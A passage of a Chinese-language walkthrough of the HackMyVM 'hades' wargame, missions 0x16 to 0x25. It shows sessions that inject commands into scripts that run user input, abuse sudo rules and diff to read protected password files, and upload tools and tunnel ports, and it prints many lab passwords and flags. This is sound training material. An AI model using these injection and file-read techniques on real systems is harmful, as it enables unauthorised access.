<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">cat</span> auri_old.sh 

<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">echo</span> <span class="token string">"What?"</span>
<span class="token builtin class-name">read</span> hackme
<span class="token comment">#Secure the condition!</span>
<span class="token comment">#if [[ $hackme =~ "????????" ]]; then</span>
<span class="token comment">#exit</span>
<span class="token comment">#fi</span>
<span class="token comment">#Add newest Aura pass!</span>
<span class="token comment">#$hackme AURANEWPASS 2>/dev/null</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> a.sh
<span class="token builtin class-name">echo</span> <span class="token string">"What?"</span>
<span class="token builtin class-name">read</span> hackme
<span class="token comment">#Secure the condition!</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$hackme</span> <span class="token operator">=~</span> <span class="token string">"????????"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token builtin class-name">exit</span>
<span class="token keyword">fi</span>
<span class="token comment">#Add newest Aura pass!</span>
<span class="token variable">$hackme</span> AURANEWPASS <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null  



 ~/Desktop                                                                                                                                                                                                            root@kali2  <span class="token number">17</span>:15:51 
<span class="token operator">></span> <span class="token function">bash</span> a.sh
What?
<span class="token builtin class-name">eval</span> <span class="token function">id</span><span class="token punctuation">;</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>我测试了半天能在kali上执行但是在靶机上就是执行不了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> aura /bin/bash <span class="token parameter variable">-c</span> /pwned/aura/auri.sh
What?
<span class="token builtin class-name">printf</span>
TiqpedAFjwmVyBlYpzRhathena@hades</code></pre>
<p>后来怀疑echo不行用了printf出来了密码，我到底要看看脚本里面写什么</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">cat</span> auri.sh 

<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">echo</span> <span class="token string">"What?"</span>
<span class="token builtin class-name">read</span> hackme
<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$hackme</span> <span class="token operator">==</span> *<span class="token string">"e"</span>* <span class="token operator">||</span> <span class="token variable">$hackme</span> <span class="token operator">==</span> *<span class="token string">"o"</span>* <span class="token operator">||</span> <span class="token variable">$hackme</span> <span class="token operator">==</span> *<span class="token string">"?"</span>* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token builtin class-name">exit</span>
<span class="token keyword">fi</span>
<span class="token variable">$hackme</span> TiqpedAFjwmVyBlYpzRh <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>
<p>发现eo?都被过滤怪不得eval echo都不行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">cat</span> flagz.txt 
^YFMNmPnlKNpnWiYOhYy^</code></pre>
<h2 id="MISSSION-0x16"><a href="#MISSSION-0x16" class="headerlink" title="MISSSION 0x16"></a>MISSSION 0x16</h2><pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x16 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User aegle has a good memory <span class="token keyword">for</span> numbers.

<span class="token comment">## ES ##</span>
La usuaria aegle tiene buena memoria para los numeros.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root aura  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> aura aura   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> aura aura  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> aura aura   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r-x--- <span class="token number">1</span> root aura   <span class="token number">160</span> Apr  <span class="token number">5</span> 06:36 auri.sh
-rw-r----- <span class="token number">1</span> root aura    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root aura   <span class="token number">168</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rw---x--- <span class="token number">1</span> root aura <span class="token number">16064</span> Apr  <span class="token number">5</span> 06:36 numbers</code></pre>
<p>就是猜数字呗，直到全对，1231239111126</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ ./numbers 
Enter one number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">2</span>
Number OK
Enter next number:
<span class="token number">3</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">2</span>
Number OK
Enter next number:
<span class="token number">3</span>
Number OK
Enter next number:
<span class="token number">9</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">2</span>
Number OK
Enter next number:
<span class="token number">6</span>
YRturIymmHSdBmEClEGe</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">cat</span> flagz.txt 
^XCwOqgVvWpDVwPVVUJa^</code></pre>
<h2 id="MISSSION-0x17"><a href="#MISSSION-0x17" class="headerlink" title="MISSSION 0x17"></a>MISSSION 0x17</h2><pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x17 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User calliope likes to have her things looked at.

<span class="token comment">## ES ##</span>
A la usuaria calliope le gusta que le miren sus cosas.
aegle@hades:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> aegle on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User aegle may run the following commands on hades:
    <span class="token punctuation">(</span>calliope<span class="token punctuation">)</span> NOPASSWD: /bin/cat
aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> calliope /bin/cat calliope_pass.txt 
/bin/cat: calliope_pass.txt: Permission denied
aegle@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-x--- <span class="token number">2</span> root  aegle    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root  root     <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> aegle aegle     <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> aegle aegle    <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> aegle aegle     <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root  calliope   <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 calliope_pass.txt
-rw-r----- <span class="token number">1</span> root  aegle      <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root  aegle     <span class="token number">176</span> Apr  <span class="token number">5</span> 06:36 mission.txt
aegle@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> calliope* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/pwned/aegle/calliope_pass.txt
aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> calliope /bin/cat /pwned/aegle/calliope_pass.txt
/bin/cat: /pwned/aegle/calliope_pass.txt: Permission denied</code></pre>
<p>密码不让读,只能直接读flag从平台拿密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> calliope /bin/cat /pwned/calliope/flagz.txt 
^rFWOMwBJDidqSNtEJGJ^</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">calliope/IlhyWxZuqIHAuqVOpXfQ</code></pre>
<h2 id="MISSION-0x18"><a href="#MISSION-0x18" class="headerlink" title="MISSION 0x18"></a>MISSION 0x18</h2><pre class="language-bash" data-language="bash"><code class="language-bash">calliope@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x18 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user calypso often uses <span class="token function">write</span> to communicate.

<span class="token comment">## ES ##</span>
La usuaria calypso suele usar <span class="token function">write</span> para comunicarse.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">calliope@hades:~$ ./writeme  
Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>calliope@hades:~$ </code></pre>
<p>这里没思路，看了别人的wp。write是很远古的工具 可以在tty之间传消息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">calliope@hades:~$ mesg y
calliope@hades:~$ ./writeme
Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>TAMYefoHcCPmexwImodo^OCbFzMIKPQOZQMEUKwEi^Cannot send you my pass<span class="token operator">!</span>calliope@hades:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">TAMYefoHcCPmexwImodo
^OCbFzMIKPQOZQMEUKwEi^</code></pre>
<p>原来是个隐藏的flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">calypso@hades:~$ <span class="token function">cat</span> flagz.txt 
^pssqdorRTYuTKuQBOYd^</code></pre>
<h2 id="MISSION-0x19"><a href="#MISSION-0x19" class="headerlink" title="MISSION 0x19"></a>MISSION 0x19</h2><pre class="language-bash" data-language="bash"><code class="language-bash">calypso@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x19 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User cassandra always wanted to be on TV.

<span class="token comment">## ES ##</span>
La usuaria cassandra siempre quiso salir en la TV.</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">calypso@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">8556</span>
drwxr-x--- <span class="token number">2</span> root    calypso    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root    root       <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> calypso calypso     <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> calypso calypso    <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> calypso calypso     <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root    calypso <span class="token number">8726358</span> Dec <span class="token number">20</span>  <span class="token number">2021</span> cassy.wav
-rw-r----- <span class="token number">1</span> root    calypso      <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root    calypso     <span class="token number">164</span> Apr  <span class="token number">5</span> 06:36 mission.txt</code></pre>
<p>下载下来试了一下发现是SSTV，用手机上的Robot36听<br><img src="https://ooo.0x0.ooo/2024/06/25/OPhRSG.jpg" alt="OPhRSG.jpg" loading="lazy"><br><code>CKzlnvmHOz</code>应该是密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@127.0.0.1's password: 
Permission denied, please try again.</code></pre>
<p>很幽默吗仔细看了一下发现倒数第二位是Q</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">CKzlnvmHQz</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-x--- <span class="token number">2</span> root      cassandra <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root      root      <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> cassandra cassandra  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> cassandra cassandra <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> cassandra cassandra  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root      cassandra   <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root      cassandra  <span class="token number">369</span> Apr  <span class="token number">5</span> 06:36 here.txt
-rw-r----- <span class="token number">1</span> root      cassandra  <span class="token number">147</span> Apr  <span class="token number">5</span> 06:36 mission.txt
cassandra@hades:~$ <span class="token function">cat</span> flagz.txt 
^lntvcYNlazEljOyZYKz^</code></pre>
<h2 id="MISSION-0x20"><a href="#MISSION-0x20" class="headerlink" title="MISSION 0x20"></a>MISSION 0x20</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x20 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User cassiopeia sees the invisible. 

<span class="token comment">## ES ##</span>
La usuaria cassiopeia ve lo invisible.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@hades:~$ <span class="token function">cat</span> here.txt 
VGhlIHBhc3N3b3JkIG9mIGNhc3Npb3BlaWEgaXM6CSAgICAgIAkgICAgCSAgIAkgICAgIAkgICAg
CSAgICAKICAgCSAgICAJICAJICAgIAkgCSAgIAkgICAgICAgCSAgICAJICAgIAoJICAgICAgCQkg
CSAgIAkgICAJICAgIAkgICAgIAkgICAgIAkgIAogICAJIAkgICAgIAkgICAgICAJICAgIAkgICAg
ICAJICAJICAJIAkgICAKICAgCSAgICAgIAkgICAgCSAJICAgICAJICAgICAgCSAgICAJICAgCSAg
<span class="token assign-left variable">ICAgCgkgICAgCSAgICAJIAkgICAgICAJICAgICAJIAkgCSAgICAgICAJIAo</span><span class="token operator">=</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/25/OPhtw1.png" alt="OPhtw1.png" loading="lazy"><br>盲猜测snow隐写<br><img src="https://ooo.0x0.ooo/2024/06/25/OPhHDD.png" alt="OPhHDD.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gRqFnHblmZVZSfegPLvO</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">cat</span> flagz.txt 
^GyWbcpEpqMsqMsjilzX^</code></pre>
<h2 id="MISSION-0x21"><a href="#MISSION-0x21" class="headerlink" title="MISSION 0x21"></a>MISSION 0x21</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x21 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User clio hates spaces. 

<span class="token comment">## ES ##</span>
La usuaria clio odia los espacios.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> cassiopeia on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User cassiopeia may run the following commands on hades:
    <span class="token punctuation">(</span>clio<span class="token punctuation">)</span> NOPASSWD: /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/differences.sh
cassiopeia@hades:~$ <span class="token function">cat</span> /usr/local/src/differences.sh

<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">echo</span> File to compare:<span class="token operator">!</span>
<span class="token builtin class-name">read</span> differences
<span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span><span class="token number">0</span> <span class="token builtin class-name">read</span> file1 file2 <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"<span class="token variable">$differences</span>"</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$differences</span>"</span> <span class="token operator">=~</span> <span class="token punctuation">\</span> <span class="token operator">|</span><span class="token punctuation">\</span>' <span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token keyword">then</span>
   <span class="token builtin class-name">echo</span> <span class="token string">"No spaces!!"</span>
<span class="token keyword">else</span>
/usr/bin/diff <span class="token variable">$file1</span> <span class="token variable">$file2</span>
<span class="token keyword">fi</span></code></pre>
<p>diff可以用来读文件 <code>diff filename /dev/null</code>不过这里分隔符是0<br>读下密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> clio* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token parameter variable">-ls</span>
  <span class="token number">1054047</span>      <span class="token number">4</span> -rw-r-----   <span class="token number">1</span> root     clio           <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 /var/local/clio_pass.txt
  <span class="token number">1050141</span>      <span class="token number">4</span> drwxr-x---   <span class="token number">2</span> root     clio         <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 /pwned/clio
cassiopeia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> clio /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/differences.sh
File to compare:<span class="token operator">!</span>
/dev/null0/var/local/clio_pass.txt
0a1
<span class="token operator">></span> cqJqRPaUtuoUYXbaxnZq</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> clio /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/differences.sh
File to compare:<span class="token operator">!</span>
/dev/null0/pwned/clio/flagz.txt
0a1
<span class="token operator">></span> ^XUJbvPwAZYgoUgkpeSv^</code></pre>
<p>顺便拿下flag</p>
<h2 id="MISSION-0x22"><a href="#MISSION-0x22" class="headerlink" title="MISSION 0x22"></a>MISSION 0x22</h2><pre class="language-bash" data-language="bash"><code class="language-bash">clio@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x22 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user cybele uses her lastname as a password.

<span class="token comment">## ES ##</span>
La usuaria cybele usa <span class="token function">su</span> apellido como password.</code></pre>
<p>cybele用她姓作为密码<br>在<code>/etc/passwd</code>下找到密码<code>UICacOPmJMWbKyPwNZod</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cybele:x:2014:2014:UICacOPmJMWbKyPwNZod:/pwned/cybele:/bin/bash</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cybele@hades:~$ <span class="token function">cat</span> flagz.txt 
^bTsTIOmJELcaxEiIaCA^</code></pre>
<h2 id="MISSION-0x23"><a href="#MISSION-0x23" class="headerlink" title="MISSION 0x23"></a>MISSION 0x23</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cybele@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x23 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User cynthia sees things that others dont.

<span class="token comment">## ES ##</span>
La usuaria cynthia ve cosas que el resto no ven.</code></pre>
<p>cynthia可以看见其他人看不见的东西，隐写？</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cybele@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">3220</span>
drwxr-x--- <span class="token number">2</span> root   cybele    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root      <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> cybele cybele     <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> cybele cybele    <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> cybele cybele     <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root   cybele      <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root   cybele <span class="token number">3263057</span> Dec <span class="token number">30</span>  <span class="token number">2021</span> fun.png
-rw-r----- <span class="token number">1</span> root   cybele     <span class="token number">163</span> Apr  <span class="token number">5</span> 06:36 mission.txt</code></pre>
<p>目录下有个fun的png文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-P</span> <span class="token number">6666</span> cybele@hades.hackmyvm.eu:/pwned/cybele/fun.png <span class="token builtin class-name">.</span> 
<span class="token operator">></span> <span class="token function">file</span> fun.png                               
fun.png: PNG image data, <span class="token number">1600</span> x <span class="token number">1980</span>, <span class="token number">8</span>-bit/color RGBA, non-interlaced</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/06/OPLY8p.png" alt="OPLY8p.png" loading="lazy"><br>拿到cynthia密码<code>QHLjXdGSiRShtWpMwFjj</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cynthia@hades:~$ <span class="token function">cat</span> flagz.txt 
^ZRSCKeYYlHkCEiHsEOI^</code></pre>
<h2 id="MISSION-0x24"><a href="#MISSION-0x24" class="headerlink" title="MISSION 0x24"></a>MISSION 0x24</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cynthia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x24 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User daphne once told us: Gemini? gem-evil.hmv? WTF?

<span class="token comment">## ES ##</span>
La usuaria daphne nos dijo una vez: Gemini? gem-evil.hmv? WTF?</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">cynthia@hades:~$ <span class="token function">curl</span> gem-evil.hmv
curl: <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> Could not resolve host: gem-evil.hmv</code></pre>
<p>访问不了，做个端口转发到本地看看怎么个事<br>md，没ss指令不知道开放了哪个端口<br>传个ss上去</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cynthia@hades:/var/tmp$ <span class="token function">cat</span> <span class="token number">456</span> <span class="token operator">|</span>base64 <span class="token parameter variable">-d</span> <span class="token operator">></span> <span class="token number">446</span> 
cynthia@hades:/var/tmp$ <span class="token function">chmod</span> +x <span class="token number">446</span>
cynthia@hades:/var/tmp$ ./446 <span class="token parameter variable">-tulnp</span>
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                             <span class="token number">127.0</span>.0.11:56483                                           <span class="token number">0.0</span>.0.0:*                                              
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                                <span class="token number">0.0</span>.0.0:44595                                           <span class="token number">0.0</span>.0.0:*                                              
udp                     UNCONN                   <span class="token number">0</span>                        <span class="token number">0</span>                                                <span class="token number">0.0</span>.0.0:55168                                           <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">4096</span>                                          <span class="token number">127.0</span>.0.11:38595                                           <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                            <span class="token number">127.0</span>.0.1:6667                                            <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">511</span>                                              <span class="token number">0.0</span>.0.0:80                                              <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                              <span class="token number">0.0</span>.0.0:22                                              <span class="token number">0.0</span>.0.0:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">1024</span>                                                   *:1965                                                  *:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">511</span>                                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:80                                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">32</span>                                                     *:21                                                    *:*                                              
tcp                     LISTEN                   <span class="token number">0</span>                        <span class="token number">128</span>                                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*        </code></pre>
<p>估计是这个1965端口<br>转发到本地看看</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-p</span> <span class="token number">6666</span> cynthia@hades.hackmyvm.eu <span class="token parameter variable">-L</span> <span class="token number">1965</span>:127.0.0.1:1965</code></pre>
<p>然后用gemini协议访问gem-evil.hmv<br>先下载个amfora</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> amfora</code></pre>
<p>保持端口转发的ssh不要端口然后访问gem-evil.hmv</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">amfora gemini://gem-evil.hmv</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/06/OPL6Bq.png" alt="OPL6Bq.png" loading="lazy"><br>拿到密码<code>EkdtKuXCJjlFKFpKgddX</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">cat</span> flagz.txt 
^ieOhnUKZlYZSSrIPgaJ^</code></pre>
<h2 id="MISSION-0x25"><a href="#MISSION-0x25" class="headerlink" title="MISSION 0x25"></a>MISSION 0x25</h2><pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x25 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user delia has a good memory, she only has to see her password <span class="token keyword">for</span> a few seconds to remember it.

<span class="token comment">## ES ##</span>
La usuaria delia tiene buena memoria, solo tiene que ver unos segundos <span class="token function">su</span> password para recordarlo.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">daphne@hades:~$ <span class="token function">cat</span> old.sh 

<span class="token comment">#!/bin/bash</span>
<span class="token comment">#OUTPUT="PASSWORD_DELIA" &lt;-- UPDATE IT!</span>
<span class="token assign-left variable">secretfile</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp /tmp/XXX<span class="token variable">)</span></span>
<span class="token function">chmod</span> <span class="token number">664</span> <span class="token string">"<span class="token variable">$secretfile</span>"</span>
<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">5</span>></span><span class="token string">"<span class="token variable">$secretfile</span>"</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$OUTPUT</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;5</span>
<span class="token function">sleep</span> <span class="token number">0.01</span>
<span class="token function">rm</span> <span class="token string">"<span class="token variable">$secretfile</span>"</span></code></pre>
